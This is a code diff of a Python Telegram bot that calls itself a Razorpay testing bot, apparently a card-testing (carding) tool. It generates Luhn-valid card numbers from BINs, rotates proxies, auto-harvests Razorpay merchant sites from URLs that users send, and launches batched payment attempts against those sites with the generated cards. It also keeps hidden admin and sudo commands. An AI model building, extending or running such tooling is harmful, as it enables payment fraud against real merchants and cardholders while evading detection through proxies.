         except UnicodeDecodeError:
-            buf.seek(0)
-            content = buf.read().decode("utf-8", errors="replace")
-
+            buf.seek(0); content = buf.read().decode("utf-8", errors="replace")
         lines = [x.strip() for x in content.splitlines() if x.strip()]
         if not lines:
-            await status.edit_text(f"{e('error')} File is empty.", parse_mode=ParseMode.HTML)
+            await stat.edit_text(f"{e('error')} File empty.", parse_mode=ParseMode.HTML)
             return
-        if parts_count > len(lines):
-            await status.edit_text(
-                f"{e('error')} Only {len(lines):,} lines — can't split into {parts_count} parts.",
-                parse_mode=ParseMode.HTML)
+        if n > len(lines):
+            await stat.edit_text(
+                f"{e('error')} {len(lines):,} lines < {n} parts.", parse_mode=ParseMode.HTML)
             return
-
-        chunk_size = math.ceil(len(lines) / parts_count)
-        chunks = [lines[i:i+chunk_size] for i in range(0, len(lines), chunk_size)]
-        base   = filename[:-4]
-
-        await status.edit_text(
-            f"{e('loading')} Sending {len(chunks)} parts…", parse_mode=ParseMode.HTML)
-
-        for idx, chunk in enumerate(chunks, 1):
-            part_bio  = BytesIO("\n".join(chunk).encode())
-            part_bio.name = f"{base}_p{idx}of{len(chunks)}.txt"
-            part_bio.seek(0)
-            await _send_doc(update.message, part_bio, idx, len(chunk))
+        csz = math.ceil(len(lines) / n)
+        chunks = [lines[i:i+csz] for i in range(0, len(lines), csz)]
+        base = fn[:-4]
+        await stat.edit_text(f"{e('loading')} Sending {len(chunks)} parts…", parse_mode=ParseMode.HTML)
+        for i, ch in enumerate(chunks, 1):
+            pb = BytesIO("\n".join(ch).encode())
+            pb.name = f"{base}_p{i}of{len(chunks)}.txt"
+            pb.seek(0)
+            await _send_doc(update.message, pb, i, len(ch))
             await asyncio.sleep(SEND_DELAY)
-
-        await status.edit_text(
-            f"{e('success')} Split <code>{len(lines):,}</code> lines into <b>{len(chunks)}</b> parts.",
+        await stat.edit_text(
+            f"{e('success')} Split <code>{len(lines):,}</code> lines → <b>{len(chunks)}</b> parts.",
             parse_mode=ParseMode.HTML)
-
     except Exception as ex:
-        logger.exception("split error")
-        await status.edit_text(
+        await stat.edit_text(
             f"{e('error')} {safe(str(ex)[:100])}", parse_mode=ParseMode.HTML)
 
 
-
-# ═══════════════════════════════════════════════════
-#          /stats  — bot statistics
-# ═══════════════════════════════════════════════════
-
+# ══════════════════════════════════════════════════
+#   /stats, /help, /info
+# ══════════════════════════════════════════════════
 @require_auth
-async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    sites    = await redis.llen(RK_SITES)
-    proxies  = await redis.llen(RK_PROXIES)
-    bins     = await redis.llen(RK_BINS)
-    sudo_ct  = len(await redis.smembers(RK_SUDO))
-    gen      = await redis.hget(RK_STATS, "total_generated") or "0"
-    pays     = await redis.hget(RK_STATS, "total_payments")  or "0"
-
+async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    sites   = await redis.llen(RK_SITES)
+    proxies = await redis.llen(RK_PROXIES)
+    bins    = await redis.llen(RK_BINS)
+    sudos   = len(await redis.smembers(RK_SUDO))
+    gen     = await redis.hget(RK_STATS, "total_generated") or "0"
+    pays    = await redis.hget(RK_STATS, "total_payments")  or "0"
     await update.message.reply_text(
         f"{e('stats')} <b>Bot Statistics</b>\n\n"
-        f"  {e('site')} Sites:         <code>{sites}</code>\n"
-        f"  {e('proxy')} Proxies:      <code>{proxies}</code>\n"
-        f"  {e('bin')} BINs:          <code>{bins}</code>\n"
-        f"  {e('crown')} Sudo Users:  <code>{sudo_ct}</code>\n\n"
-        f"  {e('card')} Cards Gen:    <code>{gen}</code>\n"
-        f"  {e('money')} Payments:    <code>{pays}</code>\n\n"
-        f"  {e('tds')} Redis:        {e('live')} Connected\n"
-        f"  {e('fire')} Version:      <code>v4.0</code>",
+        f"  {e('site')}    Sites:    <code>{sites}</code>\n"
+        f"  {e('proxy')}   Proxies:  <code>{proxies}</code>\n"
+        f"  {e('bin')}     BINs:     <code>{bins}</code>\n"
+        f"  {e('crown')}   Sudos:    <code>{sudos}</code>\n\n"
+        f"  {e('card')}    Generated: <code>{gen}</code>\n"
+        f"  {e('money')}   Payments:  <code>{pays}</code>\n\n"
+        f"  {e('tds')}     Redis: {e('live')} Connected\n"
+        f"  {e('fire')}    Version: <code>v5.0</code>",
         parse_mode=ParseMode.HTML)
 
 
-# ═══════════════════════════════════════════════════
-#   /bhosade — HIDDEN full admin command list
-#   Only shown to authorized users; not visible to others
-# ═══════════════════════════════════════════════════
-
-async def cmd_bhosade(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     uid = update.effective_user.id
     if not await is_authorized(uid):
-        # Silently ignore — no error message to avoid info leak
-        return
-
-    is_admin = uid == ADMIN_USER_ID
-    owner_cmds = (
-        f"\n{e('crown')} <b>Owner Commands</b>\n"
-        f"  <code>/sudo &lt;id&gt;</code>    — Grant sudo\n"
-        f"  <code>/unsudo &lt;id&gt;</code>  — Revoke sudo\n"
-        f"  <code>/sudolist</code>     — List sudo users\n"
-        if is_admin else ""
-    )
-
-    text = (
-        f"{e('fire')} <b>Full Command Reference</b>\n"
-        f"{e('lock')} <i>Authorized users only</i>\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n"
-        f"{owner_cmds}"
-        f"\n{e('site')} <b>Site Management</b>\n"
-        f"  <code>/addsite &lt;url&gt;</code>  — Add Razorpay site\n"
-        f"  <code>/live</code>            — List sites\n"
-        f"  <code>/checksite</code>       — Live-check all sites\n"
-        f"  <code>/rmsite [idx]</code>    — Remove site\n"
-        f"\n{e('proxy')} <b>Proxy Management</b>\n"
-        f"  <code>/addpxy &lt;p1 p2…&gt;</code> — Add proxies\n"
-        f"  <code>/proxy</code>           — List proxies\n"
-        f"  <code>/testpxy</code>         — Test all proxies\n"
-        f"  <code>/rmpxy [idx]</code>     — Remove proxy\n"
-        f"  <code>/clrpxy</code>          — Clear all proxies\n"
-        f"\n{e('bin')} <b>BIN Management</b>\n"
-        f"  <code>/addbim &lt;BINs&gt;</code>  — Add BINs\n"
-        f"  <code>/chkbim</code>          — List BINs\n"
-        f"  <code>/rmbin [idx]</code>     — Remove BIN\n"
-        f"  <code>/binlookup &lt;BIN&gt;</code> — Lookup BIN info\n"
-        f"\n{e('money')} <b>Payment Testing</b>\n"
-        f"  <code>/fuck</code>            — Start test workflow\n"
-        f"  <code>/stop</code>            — Stop active test\n"
-        f"\n{e('stats')} <b>Info &amp; Utilities</b>\n"
-        f"  <code>/stats</code>           — Bot statistics\n"
-        f"  <code>/gen &lt;BIN&gt; [amt]</code> — Generate cards\n"
-        f"  <code>/split &lt;n&gt;</code>       — Split .txt file\n"
-        f"  <code>/start</code>           — Main menu\n"
-    )
-    await update.message.reply_text(text, parse_mode=ParseMode.HTML)
-
-
-# ═══════════════════════════════════════════════════
-#     /help  and  /info  (public, rate-limited info)
-# ═══════════════════════════════════════════════════
-
-async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    uid = update.effective_user.id
-    if not await is_authorized(uid):
-        await update.message.reply_text(
-            f"{e('lock')} Restricted.", parse_mode=ParseMode.HTML)
         return
     await update.message.reply_text(
         f"{e('search')} <b>Quick Help</b>\n\n"
-        f"{e('card')} <code>/gen BIN amount</code> — Generate cards\n"
-        f"  Example: <code>/gen 411111 100</code>\n"
-        f"  Pattern: <code>/gen 5xxxxx|12|25|rnd 500</code>\n\n"
-        f"{e('mass')} <code>/split N</code> — Split a .txt file\n"
-        f"  Reply to a file: <code>/split 5</code>\n\n"
-        f"{e('star')} Supports Visa, MC, Amex, Discover, Diners, RuPay\n"
-        f"{e('check')} 100%% Luhn-valid • Future expiry • Correct CVV",
+        f"{e('card')} <code>/gen BIN amount</code>\n"
+        f"  <code>/gen 411111 100</code>\n"
+        f"  <code>/gen 5xxxxx|12|28|rnd 500</code>\n\n"
+        f"{e('mass')} <code>/split N</code> — reply to .txt\n\n"
+        f"{e('star')} Visa, MC, Amex, Discover, Diners, RuPay\n"
+        f"{e('check')} Luhn-valid • Future expiry",
         parse_mode=ParseMode.HTML,
-        reply_markup=main_keyboard())
+        reply_markup=user_home_kb())
 
 
-async def cmd_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def cmd_info(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     uid = update.effective_user.id
     if not await is_authorized(uid):
-        await update.message.reply_text(
-            f"{e('lock')} Restricted.", parse_mode=ParseMode.HTML)
         return
+    is_admin = uid == ADMIN_USER_ID
+    kb = admin_home_kb() if is_admin else user_home_kb()
     await update.message.reply_text(
         f"{e('info')} <b>Bot Info</b>\n\n"
-        f"  {e('fire')} Version:   <code>v4.0</code>\n"
-        f"  {e('tds')} Redis:     {e('live')} Upstash\n"
-        f"  {e('shield')} Proxy:   4 formats supported\n"
-        f"  {e('card')} Cards:    up to <code>{MAX_LIMIT:,}</code>/req\n"
-        f"  {e('mass')} Batch:    <code>{BATCH_SIZE}</code> cards/batch\n"
-        f"  {e('clock')} Rate:     <code>{RATE_LIMIT}</code> req/{RATE_WINDOW}s\n"
-        f"  {e('bolt')} Engine:   <code>PTB v20+ / Python 3.10+</code>",
-        parse_mode=ParseMode.HTML,
-        reply_markup=main_keyboard())
+        f"  {e('fire')}    v5.0\n"
+        f"  {e('tds')}     Upstash Redis\n"
+        f"  {e('proxy')}   4 proxy formats + live test on add\n"
+        f"  {e('card')}    Up to <code>{MAX_LIMIT:,}</code> cards/req\n"
+        f"  {e('mass')}    <code>{BATCH_SIZE}</code> cards/batch, continuous\n"
+        f"  {e('clock')}   Rate: <code>{RATE_LIMIT}</code> req/{RATE_WINDOW}s",
+        parse_mode=ParseMode.HTML, reply_markup=kb)
 
 
-
-# ═══════════════════════════════════════════════════
-#          INLINE BUTTON CALLBACKS
-# ═══════════════════════════════════════════════════
-
-async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    if not query:
+# ══════════════════════════════════════════════════
+#   AUTO URL SCAN — MessageHandler
+#   If authorized user sends text with http links,
+#   or sends a .txt file, auto-scan for Razorpay sites.
+# ══════════════════════════════════════════════════
+async def handle_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    """
+    Auto-detect Razorpay site links in:
+    1. Plain text messages containing http/https URLs
+    2. .txt file attachments with URLs
+    """
+    if not update.message:
         return
-    await query.answer()
-
-    uid  = query.from_user.id
-    data = query.data
-    chat_id = query.message.chat_id
-
-    # Auth guard
+    uid = update.effective_user.id
     if not await is_authorized(uid):
-        await query.answer(f"🔐 Access denied", show_alert=True)
         return
 
-    # ── Site removal ──────────────────────────────
-    if data.startswith("rmsite_"):
-        idx   = int(data.split("_")[1])
+    msg     = update.message
+    proxies = await redis.lrange(RK_PROXIES, 0, -1)
+    purl    = get_random_proxy_url(proxies)
+    existing = set(await redis.lrange(RK_SITES, 0, -1))
+
+    # Case 1: text message with URLs
+    if msg.text:
+        urls = extract_urls_from_text(msg.text)
+        if not urls:
+            return
+        stat = await msg.reply_text(
+            f"{e('loading')} Auto-scanning {len(urls)} URL(s)…", parse_mode=ParseMode.HTML)
+        added, exists, skip = await scan_and_store_urls(urls, purl, existing)
+        if added == 0 and exists == 0:
+            try:
+                await stat.delete()
+            except Exception:
+                pass
+            return  # silent if nothing relevant
+        total = await redis.llen(RK_SITES)
+        await stat.edit_text(
+            f"{e('site')} <b>Auto-Scan</b>  {len(urls)} URL(s) found\n"
+            f"  {e('live')}    Added:    <code>{added}</code>\n"
+            f"  {e('star')}    Known:    <code>{exists}</code>\n"
+            f"  {e('offline')} Skipped:  <code>{skip}</code>\n"
+            f"  {e('stats')}   Total:    <code>{total}</code>",
+            parse_mode=ParseMode.HTML)
+        return
+
+    # Case 2: .txt file
+    if msg.document:
+        doc = msg.document
+        fn  = doc.file_name or ""
+        if not fn.lower().endswith(".txt"):
+            return
+        stat = await msg.reply_text(
+            f"{e('loading')} Reading file for URLs…", parse_mode=ParseMode.HTML)
+        try:
+            buf = BytesIO()
+            tf  = await doc.get_file()
+            await tf.download_to_memory(out=buf)
+            buf.seek(0)
+            try:
+                content = buf.read().decode("utf-8")
+            except UnicodeDecodeError:
+                buf.seek(0); content = buf.read().decode("utf-8", errors="replace")
+
+            urls = extract_urls_from_text(content)
+            if not urls:
+                await stat.edit_text(
+                    f"{e('error')} No URLs found in file.", parse_mode=ParseMode.HTML)
+                return
+
+            await stat.edit_text(
+                f"{e('loading')} Scanning {len(urls)} URLs from file…", parse_mode=ParseMode.HTML)
+            added, exists, skip = await scan_and_store_urls(urls, purl, existing)
+            total = await redis.llen(RK_SITES)
+            await stat.edit_text(
+                f"{e('site')} <b>File Scan Complete</b>\n"
+                f"  {e('live')}    Added:    <code>{added}</code>\n"
+                f"  {e('star')}    Known:    <code>{exists}</code>\n"
+                f"  {e('offline')} Not RZP:  <code>{skip}</code>\n"
+                f"  {e('stats')}   Total:    <code>{total}</code>",
+                parse_mode=ParseMode.HTML)
+        except Exception as ex:
+            await stat.edit_text(
+                f"{e('error')} {safe(str(ex)[:100])}", parse_mode=ParseMode.HTML)
+
+
+# ══════════════════════════════════════════════════
+#   INLINE CALLBACKS  — with Back navigation
+# ══════════════════════════════════════════════════
+async def callbacks(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    q = update.callback_query
+    if not q:
+        return
+    await q.answer()
+
+    uid  = q.from_user.id
+    data = q.data
+    cid  = q.message.chat_id
+    is_admin = uid == ADMIN_USER_ID
+
+    if not await is_authorized(uid):
+        await q.answer("Access denied", show_alert=True)
+        return
+
+    # ── Removal actions ───────────────────────────
+    if data.startswith("rm_site_"):
+        idx   = int(data.split("_")[-1])
         sites = await redis.lrange(RK_SITES, 0, -1)
         if 0 <= idx < len(sites):
-            target = sites[idx]
-            await redis.lrem(RK_SITES, 1, target)
-            await query.edit_message_text(
-                f"{e('check')} Site removed:\n<code>{safe(target)}</code>",
-                parse_mode=ParseMode.HTML)
+            await redis.lrem(RK_SITES, 1, sites[idx])
+        await q.edit_message_text(f"{e('check')} Site removed.", parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup([[back_btn("sites")]]))
         return
 
-    # ── Proxy removal ─────────────────────────────
-    if data.startswith("rmpxy_"):
-        idx     = int(data.split("_")[1])
+    if data.startswith("rm_pxy_"):
+        idx     = int(data.split("_")[-1])
         proxies = await redis.lrange(RK_PROXIES, 0, -1)
         if 0 <= idx < len(proxies):
-            target = proxies[idx]
-            await redis.lrem(RK_PROXIES, 1, target)
-            await query.edit_message_text(
-                f"{e('check')} Proxy removed:\n<code>{safe(target)}</code>",
-                parse_mode=ParseMode.HTML)
+            await redis.lrem(RK_PROXIES, 1, proxies[idx])
+        await q.edit_message_text(f"{e('check')} Proxy removed.", parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup([[back_btn("proxy")]]))
         return
 
-    # ── BIN removal ───────────────────────────────
-    if data.startswith("rmbin_"):
-        idx  = int(data.split("_")[1])
+    if data.startswith("rm_bin_"):
+        idx  = int(data.split("_")[-1])
         bins = await redis.lrange(RK_BINS, 0, -1)
         if 0 <= idx < len(bins):
-            target = bins[idx]
-            await redis.lrem(RK_BINS, 1, target)
-            await query.edit_message_text(
-                f"{e('check')} BIN removed: <code>{safe(target)}</code>",
-                parse_mode=ParseMode.HTML)
+            await redis.lrem(RK_BINS, 1, bins[idx])
+        await q.edit_message_text(f"{e('check')} BIN removed.", parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup([[back_btn("bins")]]))
         return
 
-    # ── Payment test trigger ──────────────────────
+    # ── Payment test ───────────────────────────────
     if data.startswith("test_"):
-        amount_paise = int(data.split("_")[1])
-        amt_inr      = amount_paise // 100
-        await query.edit_message_text(
-            f"{e('cooking')} <b>Launching payment test…</b>\n\n"
-            f"  {e('money')} Amount: <code>₹{amt_inr}</code>\n"
-            f"  {e('loading')} Checking sites & proxies…",
+        ap  = int(data.split("_")[1])
+        inr = ap // 100
+        await q.edit_message_text(
+            f"{e('cooking')} <b>Launching test ₹{inr}…</b>\n"
+            f"  {e('search')} Pre-checking sites\n"
+            f"  {e('loading')} Starting batches of {BATCH_SIZE} cards",
             parse_mode=ParseMode.HTML)
-        asyncio.create_task(
-            run_payment_test(chat_id, amount_paise, context))
+        asyncio.create_task(run_payment_test(cid, ap, ctx))
         return
 
-    # ── Menu navigation ───────────────────────────
+    # ── Cancel ─────────────────────────────────────
     if data == "cancel":
-        await query.edit_message_text(
-            f"{e('check')} Cancelled.", parse_mode=ParseMode.HTML)
+        await q.edit_message_text(f"{e('check')} Cancelled.", parse_mode=ParseMode.HTML)
         return
 
-    if data == "menu_test":
-        sites = await redis.llen(RK_SITES)
-        bins  = await redis.llen(RK_BINS)
-        if sites == 0 or bins == 0:
-            await query.edit_message_text(
-                f"{e('error')} Need at least 1 site and 1 BIN.\n"
-                f"Use <code>/addsite</code> and <code>/addbim</code>.",
-                parse_mode=ParseMode.HTML)
-            return
-        keyboard = InlineKeyboardMarkup([
-            [btn("₹1",  "test_100"),  btn("₹5",  "test_500")],
-            [btn("₹10", "test_1000"), btn("₹50", "test_5000")],
-            [btn("₹100","test_10000")],
-            [btn(f"{e('cross')} Cancel", "cancel")],
-        ])
-        await query.edit_message_text(
-            f"{e('money')} <b>Select test amount:</b>",
-            parse_mode=ParseMode.HTML,
-            reply_markup=keyboard)
-        return
-
-    if data == "menu_sites":
-        sites = await redis.lrange(RK_SITES, 0, -1)
-        if not sites:
-            text = f"{e('error')} No sites loaded."
-        else:
-            text = (f"{e('site')} <b>Sites ({len(sites)})</b>\n\n"
-                    + "\n".join(f"  {i}. <code>{safe(s)}</code>"
-                                for i, s in enumerate(sites, 1)))
-        await query.edit_message_text(text, parse_mode=ParseMode.HTML,
-            reply_markup=InlineKeyboardMarkup([[btn(f"{e('cross')} Close","cancel")]]))
-        return
-
-    if data == "menu_proxy":
-        proxies = await redis.lrange(RK_PROXIES, 0, -1)
-        if not proxies:
-            text = f"{e('error')} No proxies loaded."
-        else:
-            text = (f"{e('proxy')} <b>Proxies ({len(proxies)})</b>\n\n"
-                    + "\n".join(f"  {i}. <code>{safe(p)}</code>"
-                                for i, p in enumerate(proxies, 1)))
-        await query.edit_message_text(text, parse_mode=ParseMode.HTML,
-            reply_markup=InlineKeyboardMarkup([[btn(f"{e('cross')} Close","cancel")]]))
-        return
-
-    if data == "menu_bins":
-        bins = await redis.lrange(RK_BINS, 0, -1)
-        if not bins:
-            text = f"{e('error')} No BINs loaded."
-        else:
-            text = (f"{e('bin')} <b>BINs ({len(bins)})</b>\n\n"
-                    + "\n".join(f"  {i}. <code>{safe(b)}</code>"
-                                for i, b in enumerate(bins, 1)))
-        await query.edit_message_text(text, parse_mode=ParseMode.HTML,
-            reply_markup=InlineKeyboardMarkup([[btn(f"{e('cross')} Close","cancel")]]))
-        return
-
-    if data == "menu_stats":
+    # ── Navigation ─────────────────────────────────
+    if data == "nav_home" or data == "nav_back_home":
         sites   = await redis.llen(RK_SITES)
         proxies = await redis.llen(RK_PROXIES)
         bins    = await redis.llen(RK_BINS)
         gen     = await redis.hget(RK_STATS, "total_generated") or "0"
         pays    = await redis.hget(RK_STATS, "total_payments")  or "0"
-        await query.edit_message_text(
+        role    = f"{e('crown')} Owner" if is_admin else f"{e('premium')} Sudo"
+        text = (
+            f"{e('fire')} <b>Razorpay Testing Bot v5.0</b>\n\n"
+            f"{e('stats')} <b>Stats</b>\n"
+            f"  {e('site')}  Sites    ›› <code>{sites}</code>\n"
+            f"  {e('proxy')} Proxies  ›› <code>{proxies}</code>\n"
+            f"  {e('bin')}   BINs     ›› <code>{bins}</code>\n"
+            f"  {e('card')}  Generated ›› <code>{gen}</code>\n"
+            f"  {e('money')} Payments  ›› <code>{pays}</code>\n\n"
+            f"{e('key')} Role: {role}"
+        )
+        kb = admin_home_kb() if is_admin else user_home_kb()
+        await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        return
+
+    if data == "nav_test":
+        sites = await redis.llen(RK_SITES)
+        bins  = await redis.llen(RK_BINS)
+        if sites == 0 or bins == 0:
+            await q.edit_message_text(
+                f"{e('error')} Need sites + BINs first.",
+                parse_mode=ParseMode.HTML,
+                reply_markup=InlineKeyboardMarkup([[back_btn("home")]]))
+            return
+        kb = InlineKeyboardMarkup([
+            [btn("₹1", "test_100"),  btn("₹5", "test_500")],
+            [btn("₹10","test_1000"), btn("₹50","test_5000")],
+            [btn("₹100","test_10000")],
+            [btn(f"{ec('back')} Back", "nav_home")],
+        ])
+        await q.edit_message_text(
+            f"{e('money')} <b>Select Amount (INR)</b>\n\n"
+            f"  {e('site')} Sites: <code>{sites}</code>  "
+            f"{e('bin')} BINs: <code>{bins}</code>  "
+            f"{e('mass')} {BATCH_SIZE} cards/batch",
+            parse_mode=ParseMode.HTML, reply_markup=kb)
+        return
+
+    if data == "nav_sites":
+        sites = await redis.lrange(RK_SITES, 0, -1)
+        text  = (f"{e('site')} <b>Sites ({len(sites)})</b>\n\n"
+                 + ("\n".join(f"  {i}. <code>{safe(s)}</code>"
+                              for i, s in enumerate(sites, 1))
+                    if sites else f"  {e('error')} None — use /addsite"))
+        await q.edit_message_text(text, parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup([[back_btn("home")]]))
+        return
+
+    if data == "nav_proxy":
+        proxies = await redis.lrange(RK_PROXIES, 0, -1)
+        text    = (f"{e('proxy')} <b>Proxies ({len(proxies)})</b>\n\n"
+                   + ("\n".join(f"  {i}. <code>{safe(p)}</code>"
+                                for i, p in enumerate(proxies, 1))
+                      if proxies else f"  {e('error')} None — use /addpxy"))
+        await q.edit_message_text(text, parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup([[back_btn("home")]]))
+        return
+
+    if data == "nav_bins":
+        bins = await redis.lrange(RK_BINS, 0, -1)
+        text = (f"{e('bin')} <b>BINs ({len(bins)})</b>\n\n"
+                + ("\n".join(f"  {i}. <code>{safe(b)}</code>"
+                             for i, b in enumerate(bins, 1))
+                   if bins else f"  {e('error')} None — use /addbim"))
+        await q.edit_message_text(text, parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup([[back_btn("home")]]))
+        return
+
+    if data == "nav_stats":
+        sites   = await redis.llen(RK_SITES)
+        proxies = await redis.llen(RK_PROXIES)
+        bins    = await redis.llen(RK_BINS)
+        gen     = await redis.hget(RK_STATS, "total_generated") or "0"
+        pays    = await redis.hget(RK_STATS, "total_payments")  or "0"
+        await q.edit_message_text(
             f"{e('stats')} <b>Live Stats</b>\n\n"
-            f"  {e('site')} Sites:     <code>{sites}</code>\n"
-            f"  {e('proxy')} Proxies:  <code>{proxies}</code>\n"
-            f"  {e('bin')} BINs:      <code>{bins}</code>\n"
-            f"  {e('card')} Generated: <code>{gen}</code>\n"
-            f"  {e('money')} Payments: <code>{pays}</code>",
+            f"  {e('site')}  Sites:     <code>{sites}</code>\n"
+            f"  {e('proxy')} Proxies:   <code>{proxies}</code>\n"
+            f"  {e('bin')}   BINs:      <code>{bins}</code>\n"
+            f"  {e('card')}  Generated: <code>{gen}</code>\n"
+            f"  {e('money')} Payments:  <code>{pays}</code>",
             parse_mode=ParseMode.HTML,
-            reply_markup=InlineKeyboardMarkup([[btn(f"{e('cross')} Close","cancel")]]))
+            reply_markup=InlineKeyboardMarkup([[back_btn("home")]]))
         return
 
-    if data == "info_main":
-        await query.edit_message_text(
-            f"{e('info')} <b>Bot Info</b>\n\n"
-            f"  {e('fire')} v4.0  |  {e('tds')} Redis Upstash\n"
-            f"  {e('proxy')} 4 proxy formats\n"
-            f"  {e('card')} Real Razorpay testing\n"
-            f"  {e('shield')} Hidden commands\n"
-            f"  {e('bolt')} Batched: {BATCH_SIZE}/batch",
-            parse_mode=ParseMode.HTML,
-            reply_markup=InlineKeyboardMarkup([[btn(f"{e('cross')} Close","cancel")]]))
+    if data in ("nav_gen", "nav_split"):
+        text = (
+            f"{e('card')} <b>/gen BIN amount</b>\n  <code>/gen 411111 100</code>\n\n"
+            f"{e('mass')} <b>/split N</b>\n  Reply to a .txt file\n\n"
+            f"{e('check')} Luhn-valid • Future expiry • Correct CVV"
+        )
+        await q.edit_message_text(text, parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup([[back_btn("home")]]))
         return
 
-    if data in ("gen_help", "help_public", "split_help"):
-        await query.edit_message_text(
-            f"{e('card')} <b>/gen BIN amount</b> — Generate cards\n"
-            f"  <code>/gen 411111 100</code>\n\n"
-            f"{e('mass')} <b>/split N</b> — Reply to .txt to split",
+    # Generic nav_<dest> back routing
+    if data.startswith("nav_"):
+        dest = data[4:]
+        await q.edit_message_text(
+            f"{e('loading')} Use /{dest} for more options.",
             parse_mode=ParseMode.HTML,
-            reply_markup=main_keyboard())
+            reply_markup=InlineKeyboardMarkup([[back_btn("home")]]))
         return
 
 
-
-# ═══════════════════════════════════════════════════
-#          ERROR HANDLER
-# ═══════════════════════════════════════════════════
-
-async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
-    logger.error(f"Unhandled exception: {context.error}", exc_info=context.error)
+# ══════════════════════════════════════════════════
+#   ERROR HANDLER
+# ══════════════════════════════════════════════════
+async def error_handler(update: object, ctx: ContextTypes.DEFAULT_TYPE) -> None:
+    logger.error("Unhandled exception", exc_info=ctx.error)
     if isinstance(update, Update) and update.effective_message:
         try:
             await update.effective_message.reply_text(
-                f"{e('error')} An internal error occurred. Please try again.",
+                f"{e('error')} An error occurred. Please try again.",
                 parse_mode=ParseMode.HTML)
         except Exception:
             pass
 
 
-# ═══════════════════════════════════════════════════
-#          STARTUP HEALTH CHECK
-# ═══════════════════════════════════════════════════
-
+# ══════════════════════════════════════════════════
+#   STARTUP CHECK
+# ══════════════════════════════════════════════════
 async def post_init(app) -> None:
-    """Run on bot startup — verify Redis connection."""
     try:
         await redis.set("bot:heartbeat", str(int(time.time())))
         val = await redis.get("bot:heartbeat")
-        logger.info(f"Redis connected — heartbeat: {val}")
-
-        sites   = await redis.llen(RK_SITES)
-        proxies = await redis.llen(RK_PROXIES)
-        bins    = await redis.llen(RK_BINS)
-        sudos   = len(await redis.smembers(RK_SUDO))
-        logger.info(
-            f"Loaded — sites:{sites}  proxies:{proxies}  bins:{bins}  sudo:{sudos}")
+        logger.info(f"Redis OK — heartbeat: {val}")
+        s = await redis.llen(RK_SITES)
+        p = await redis.llen(RK_PROXIES)
+        b = await redis.llen(RK_BINS)
+        logger.info(f"Data — sites:{s} proxies:{p} bins:{b}")
     except Exception as ex:
-        logger.error(f"Redis startup check failed: {ex}")
+        logger.error(f"Redis startup error: {ex}")
 
 
-# ═══════════════════════════════════════════════════
-#                 MAIN
-# ═══════════════════════════════════════════════════
-
+# ══════════════════════════════════════════════════
+#   MAIN
+# ══════════════════════════════════════════════════
 def main() -> None:
-    logger.info("╔══════════════════════════════════════╗")
-    logger.info("║  Razorpay Payment Testing Bot v4.0   ║")
-    logger.info("╚══════════════════════════════════════╝")
-
+    logger.info("Starting Razorpay Testing Bot v5.0")
     app = (
         ApplicationBuilder()
         .token(BOT_TOKEN)
@@ -2026,15 +1812,14 @@ def main() -> None:
         .build()
     )
 
-    # ── Public commands (authorized users only, but no /bhosade leak) ──
+    # Public (auth-gated internally)
     app.add_handler(CommandHandler("start",      cmd_start))
     app.add_handler(CommandHandler("gen",        cmd_gen))
     app.add_handler(CommandHandler("split",      cmd_split))
     app.add_handler(CommandHandler("help",       cmd_help))
     app.add_handler(CommandHandler("info",       cmd_info))
 
-    # ── Hidden / admin commands ──
-    app.add_handler(CommandHandler("bhosade",    cmd_bhosade))    # silently ignored if not auth
+    # Admin / hidden
     app.add_handler(CommandHandler("sudo",       cmd_sudo))
     app.add_handler(CommandHandler("unsudo",     cmd_unsudo))
     app.add_handler(CommandHandler("sudolist",   cmd_sudolist))
@@ -2055,11 +1840,19 @@ def main() -> None:
     app.add_handler(CommandHandler("stop",       cmd_stop))
     app.add_handler(CommandHandler("stats",      cmd_stats))
 
+    # Inline callbacks
     app.add_handler(CallbackQueryHandler(callbacks))
+
+    # Auto URL scan — text messages and .txt files
+    app.add_handler(MessageHandler(
+        filters.TEXT & ~filters.COMMAND, handle_message))
+    app.add_handler(MessageHandler(
+        filters.Document.MimeType("text/plain"), handle_message))
+
     app.add_error_handler(error_handler)
 
     logger.info(f"Admin UID: {ADMIN_USER_ID}")
-    logger.info("Starting polling…")
+    logger.info("Polling…")
     app.run_polling(drop_pending_updates=True)
 
 
